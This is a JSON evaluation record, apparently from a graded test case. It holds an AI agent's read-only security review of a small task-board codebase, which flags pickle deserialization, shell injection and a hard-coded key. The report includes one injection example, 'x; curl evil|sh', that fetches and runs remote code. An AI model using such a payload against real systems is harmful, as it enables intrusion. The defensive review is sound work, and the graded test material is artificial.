@@ -1,0 +1,101 @@
+{
+  "case": "h5-review#t2",
+  "arm": "v2",
+  "model": "sonnet",
+  "checks": {
+    "read_only": true,
+    "names_pickle_session": true,
+    "names_command_injection": true,
+    "decoy_not_reported_as_vuln": true
+  },
+  "passed": true,
+  "score": 1.0,
+  "segments": 1,
+  "tools": {
+    "Bash": 2,
+    "Read": 1
+  },
+  "agent_calls": 0,
+  "agent_types": [],
+  "agent_descriptions": [],
+  "final": "Security review of the working tree (9 tracked files, read-only; I changed nothing and ran no tests or scanners).\n\n**Verdict:** 3 confirmed, 1 needs validation. Two of the confirmed findings are critical. I read every file in `taskboard/` and checked each by hand. I did not use the security-verifier subagent, so the critical ones have not had a separate check.\n\n**Confirmed**\n\n- **[critical] Unsafe `pickle` session cookie: remote code execution.** `taskboard/session.py:13` runs `pickle.loads(base64.urlsafe_b64decode(cookie.encode()))` on the raw `tb_session` cookie.\n  - **Who:** anyone who can send a request with a cookie can run arbitrary code on the server.\n  - **Why nothing stops it:** the cookie has no signature check. `session.py` never calls `notify.sign` or `notify.verify`, and `dump_session` (`session.py:6`) doesn't sign either.\n  - **Fix:** use JSON, not pickle. Sign it with HMAC and call `verify` before parsing. Add a test that a tampered or pickled payload is rejected.\n\n- **[critical] Shell injection in the project export.** `taskboard/exports.py:8` runs `subprocess.run(f\"zip -rq {archive} {attachments_dir}\", shell=True, ...)`.\n  - **Who:** anyone who controls the project name. The docstring says it is \"typed by the user\", and it feeds `archive` at `exports.py:7`.\n  - **Example:** a name like `x; curl evil|sh` runs as a command. `attachments_dir` is unquoted too.\n  - **Path traversal:** a name like `../../x` also writes the zip outside `out_dir`.\n  - **Fix:** use `subprocess.run([\"zip\", \"-rq\", archive, attachments_dir], check=True)` with no shell. Reject project names that contain `/`, `..` or leading `-`. Check that the resolved archive path stays inside `out_dir`.\n\n- **[high] Hard-coded fallback signing key.** `taskboard/notify.py:7` uses `os.environ.get(\"TB_SIGNING_KEY\", \"dev-only-key\")`.\n  - **Who:** anyone who reads the source. If the env var is unset in production, they can forge any signature.\n  - **Fix:** fail closed with no default, and raise an error at startup if the key is missing.\n\n**Needs validation**\n\n- **Missing authorization on task reads.** `taskboard/queries.py:15` (`tasks_for_owner`) and `queries.py:9` (`list_tasks`) take the owner or project as a plain argument and apply no caller identity check.\n  - **Missing fact:** the HTTP or app layer isn't in this repo, so I can't tell whether callers scope these by the signed-in user. If they don't, any user can read any project's or owner's tasks.\n\n**Rejected**\n\n- **SQL injection in `list_tasks`.** The f-string `ORDER BY {column}` at `queries.py:9` looks risky. But `column` comes from the `SORT_COLUMNS` allowlist at `queries.py:8`, with a fallback to `id`. The `project` value is bound as a parameter. `db.add_task` and `tasks_for_owner` also use `?` placeholders.\n\n**Coverage**\n- **Read:** all of `taskboard/*.py` and the README.\n- **Checked:** injection (SQL, shell), session/authn, files and paths, secrets and crypto, parsing of external input.\n- **Not covered:**\n  - The tests (`tests/test_basic.py`), which I did not read.\n  - Dependencies, because there is no manifest and osv-scanner was not run, so dependency status is unknown.\n  - CI and deploy config, which I did not check (none is tracked).\n  - There are no routes or app entry point, so authz, CORS and cookie flags can't be assessed.\n  - `db.py` uses an in-memory SQLite database, so data does not persist.\n- **Tools:** only file reads and `ult route`. `ult scan` and the findings ledger were not run.\n\nNo finding here is evidence that everything else is clean. The checks cover only what is in this repo.",
+  "is_error": false,
+  "num_turns": 4,
+  "duration_ms": 20051,
+  "cost_usd": 0.0712347,
+  "usage": {
+    "input_tokens": 6,
+    "cache_creation_input_tokens": 9928,
+    "cache_read_input_tokens": 106807,
+    "output_tokens": 2083
+  },
+  "model_usage": {
+    "claude-sonnet-5-5": {
+      "inputTokens": 6,
+      "outputTokens": 2083,
+      "cacheReadInputTokens": 106807,
+      "cacheCreationInputTokens": 9928,
+      "webSearchRequests": 0,
+      "costUSD": 0.0712347,
+      "contextWindow": 200000,
+      "maxOutputTokens": 128000,
+      "thinkingTokens": 386,
+      "cacheCreationEphemeral5mInputTokens": 0,
+      "cacheCreationEphemeral1hInputTokens": 9928,
+      "canonicalModel": "claude-sonnet-5-5",
+      "provider": "firstParty",
+      "costBasis": "list"
+    }
+  },
+  "subagent_stats": {
+    "spawned": 0,
+    "requested": {
+      "background": 0,
+      "foreground": 0,
+      "unset": 0
+    },
+    "started_in_background": 0,
+    "max_depth": 0,
+    "spawned_by_subagents": 0,
+    "completed": 0,
+    "failed": 0,
+    "killed": {
+      "parent": 0,
+      "user": 0,
+      "system": 0
+    },
+    "refused": {
+      "depth_limit": 0,
+      "concurrency_limit": 0,
+      "budget": 0
+    },
+    "by_type": {}
+  },
+  "permission_denials": 0,
+  "wall_s": 21.0,
+  "claude_rc": 0,
+  "invalid": null,
+  "workspace": "/tmp/ult-live-h/h5-review#t2__v2",
+  "transcript": "/tmp/ult-live-h/h5-review#t2__v2.jsonl",
+  "arch": {
+    "new_counts": {},
+    "arch_findings": 0,
+    "arch_blocking": 0
+  },
+  "metrics": {
+    "pass": true,
+    "graders_pass": true,
+    "total_cost_usd": 0.0712347,
+    "input_tokens": 6,
+    "output_tokens": 2083,
+    "cache_read_tokens": 106807,
+    "cache_write_tokens": 9928,
+    "turns": 4,
+    "subagents": 0,
+    "invalid": false,
+    "arch_measured": true,
+    "arch_blocking": 0,
+    "arch_findings": 0,
+    "total_tokens": 118824
+  }
+}
